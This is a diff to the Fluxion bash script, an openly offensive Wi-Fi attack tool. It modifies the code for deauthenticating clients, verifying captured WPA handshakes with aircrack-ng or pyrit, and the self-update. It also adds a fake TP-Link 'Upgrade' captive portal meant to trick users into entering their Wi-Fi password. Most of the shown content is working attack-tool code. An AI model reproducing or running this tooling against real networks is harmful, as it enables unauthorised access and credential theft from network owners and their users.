@@ -741,21 +741,21 @@ fi
 
 if [ $FLUX_DEBUG != 1 ]; then
 	echo ""
-		   sleep 0.1 && echo -e "$red "
-           sleep 0.1 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
-           sleep 0.1 && echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "
-           sleep 0.1 && echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
-           sleep 0.1 && echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "
-           sleep 0.1 && echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
-           sleep 0.1 && echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯  "
+		   sleep 0.01 && echo -e "$red "
+           sleep 0.01 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
+           sleep 0.01 && echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "
+           sleep 0.01 && echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
+           sleep 0.01 && echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "
+           sleep 0.01 && echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
+           sleep 0.01 && echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯  "
 
 	echo""
 
-	sleep 1
-	echo -e $red"                     FLUXION "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" deltax"
-	sleep 1
+	sleep 0.1
+	echo -e $red"                     FLUX "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" deltax"
+	sleep 0.1
 	echo -e $green "           Page:"$red" https://github.com/deltaxflux/fluxion "$transparent
-	sleep 1
+	sleep 0.1
 	echo -n "                              Latest rev."
 	tput civis
 	checkupdatess &
@@ -765,22 +765,27 @@ if [ $FLUX_DEBUG != 1 ]; then
 		if [ "$revision_online" != "?" ]; then
 
 			if [ "$revision" != "$revision_online" ]; then
-
-				cp $0 $HOME/flux_rev-$revision.backup
-				curl "https://raw.githubusercontent.com/deltaxflux/fluxion/master/fluxion" -s -o $0
 				echo
 				echo
-				echo -e ""$red"
-Updated successfully! Restarting the script to apply the changes ..."$transparent""
-				sleep 5
-				chmod +x $0
-				exec $0
-
+				echo "New revision found....update? [ENTER=skip]"
+				read doupdate
+				echo -ne "$transparent"
+				if [ "$doupdate" != "" ]; then
+					cp $0 $HOME/flux_rev-$revision.backup
+					curl "https://raw.githubusercontent.com/deltaxflux/fluxion/master/fluxion" -s -o $0
+					echo
+					echo
+					echo -e ""$red"
+	Updated successfully! Restarting the script to apply the changes ..."$transparent""
+					sleep 3
+					chmod +x $0
+					exec $0
+				fi
 			fi
 		fi
 	echo ""
 	tput cnorm
-	sleep 2
+	sleep 1
 
 fi
 
@@ -1433,20 +1438,23 @@ function setinterface {
 
 	if [ "$INTERFACESNUMBER" -gt "0" ]; then
 
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_setinterface"
-		echo
-		i=0
+		if [ "$INTERFACESNUMBER" -eq "1" ]; then
+			PREWIFI=$(echo ${wirelessifaces[0]} | awk '{print $1}')
+		else
+			echo $header_setinterface
+			echo
+			i=0
 
-		for line in "${wirelessifaces[@]}"; do
-			i=$(($i+1))
-			wirelessifaces[$i]=$line
-			echo -e "      "$red"["$yellow"$i"$red"]"$transparent" $line"
-		done
-		
-		echo
-		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-		read line
-		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
+			for line in "${wirelessifaces[@]}"; do
+				i=$(($i+1))
+				wirelessifaces[$i]=$line
+				echo -e "      "$red"["$yellow"$i"$red"]"$transparent" $line"
+			done
+			echo
+			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
+			read line
+			PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
+		fi
 
 		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
 			conditional_clear
@@ -3523,24 +3531,25 @@ function handshakelocation {
 
 	top
 	infoap
-	caps=` ls -h /root/handshakes/*.cap`
-
-	if [ "$caps" = "" ];then
-			echo
-			echo -e $red"No Caps found..."$transparen
-	else
-			echo
-			echo -e $blue"Avaliable caps"; echo -e  $red"$caps"	$transparent 		
-	fi 
-	echo
-	echo -e "handshake location  (Example: $red$WORK_DIR.cap$transparent)"
-	echo -e "Press ${yellow}ENTER$transparent to skip"
-	echo
-	echo -n "Path: "
-	echo -ne "$red"
-	read handshakeloc
-	echo -ne "$transparent"
-
+	if [ -f "/root/handshakes/$Host_SSID-$Host_MAC.cap" ]; then
+		echo -e "Handshake $yellow$Host_SSID-$Host_MAC.cap$transparent found in /root/handshakes."
+		echo -e "${red}Do you want to use this file?"
+		echo -ne "$transparent"
+		read usehandshakefile
+		if [ "$usehandshakefile" = "y" -o "$usehandshakefile" = "" ]; then
+			handshakeloc="/root/handshakes/$Host_SSID-$Host_MAC.cap"
+		fi
+	fi
+	if [ "$handshakeloc" = "" ]; then
+		echo
+		echo -e "handshake location  (Example: $red$WORK_DIR.cap$transparent)"
+		echo -e "Press ${yellow}ENTER$transparent to skip"
+		echo
+		echo -n "Path: "
+		echo -ne "$red"
+		read handshakeloc
+		echo -ne "$transparent"
+	fi
 		if [ "$handshakeloc" = "" ]; then
 			deauthforce
 		else
@@ -3548,28 +3557,28 @@ function handshakelocation {
 				Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
 				Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
 				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
-					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
+					if aircrack-ng $handshakeloc | grep -q "1 handshake"; then
 						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-						 webinterface
+						webinterface					
 					else
 					echo -e $yellow "Corrupted handshake" $transparent
 					echo
-					sleep 4
-					echo -e $red"you can try aircrack-ng"$transparent
-					echo -e $red"You want to try to aircrack-ng instead of pyrit to check the handshake? [n = NO]"$transparent
+					sleep 2
+					echo "you can try pyrit"
+					echo "You want to try pyrit instead of aircrack-ng to check the handshake? [ENTER = NO]"
 					echo
 
-					read handshakeloc_aircrack
+					read handshakeloc_pyrit
 					echo -ne "$transparent"
-					if [ "$handshakeloc_aircrack" = "n" ]; then
+					if [ "$handshakeloc_pyrit" = "" ]; then
 						handshakelocation
 					else
-						if aircrack-ng $handshakeloc | grep -q "1 handshake"; then
+						if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
 							cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-							webinterface
+						 	webinterface
 						else
 							echo "Corrupted handshake"
-							sleep 4
+							sleep 2
 							handshakelocation
 						fi
 					fi
@@ -3591,7 +3600,7 @@ function handshakelocation {
 				fi
 			else
 				echo -e "File ${red}NOT$transparent present"
-				sleep 4
+				sleep 2
 				handshakelocation
 			fi
 		fi
@@ -3687,6 +3696,7 @@ function deauth {
 			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
 			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
 
+	
 			if [ $LINEAS_CLIENTES -le 5 ]; then
 				DEAUTH=deauthall
 				capture & $DEAUTH
@@ -3697,7 +3707,7 @@ function deauth {
 
 			capture
 			for CLIENT in $HOST; do
-				Client_MAC=`echo ${CLIENT:0:17}`
+				Client_MAC=`echo ${CLIENT:0:17}`				
 				deauthesp
 			done
 			$DEAUTH
@@ -3923,6 +3933,7 @@ function ConnectionRESET {
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Netgear     [ESP]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Arris       [ESP]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Vodafone    [ESP]";n=`expr $n + 1`
+			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" TP-Link     [ENG]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
 			echo
 			echo -n "#? "
@@ -3956,7 +3967,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-            		elif [ "$fluxass" = "3" ]; then
+            elif [ "$fluxass" = "3" ]; then
    				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_RUS
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_RUS
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_RUS
@@ -4234,8 +4245,12 @@ function ConnectionRESET {
 			elif [ "$fluxass" = "27" ]; then
 				VODAFONE
 				break
+				
+			elif [ "$fluxass" = "28" ]; then
+				TPLINK
+				break
 
-      		elif [ "$fluxass" = "28" ]; then
+      		elif [ "$fluxass" = "29" ]; then
 				conditional_clear
 				webinterface
 				break
@@ -4363,7 +4378,7 @@ mimetype.assign = (
 server.error-handler-404 = \"/\"
 
 static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
-index-file.names = ( \"index.htm\" )
+index-file.names = ( \"index.htm\",\"index.html\",\"index.php\" )
 
 
 
@@ -7139,6 +7154,17 @@ function NETGEAR2 {
 	cp  $WORK_DIR/Sites/NETGEAR-ESP/final.html $DUMP_PATH/data
 	cp  $WORK_DIR/Sites/NETGEAR-ESP/info.html $DUMP_PATH/data
 	cp  $WORK_DIR/Sites/NETGEAR-ESP/index.htm $DUMP_PATH/data
+}
+#Conten interface web
+function TPLINK {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/Upgrade-TP-LINK/bootstrap.min.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Upgrade-TP-LINK/bootstrap.min.js $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Upgrade-TP-LINK/index.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Upgrade-TP-LINK/jquery.min.js $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Upgrade-TP-LINK/final.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Upgrade-TP-LINK/error.html $DUMP_PATH/data
 }
 
 #Conten interface web
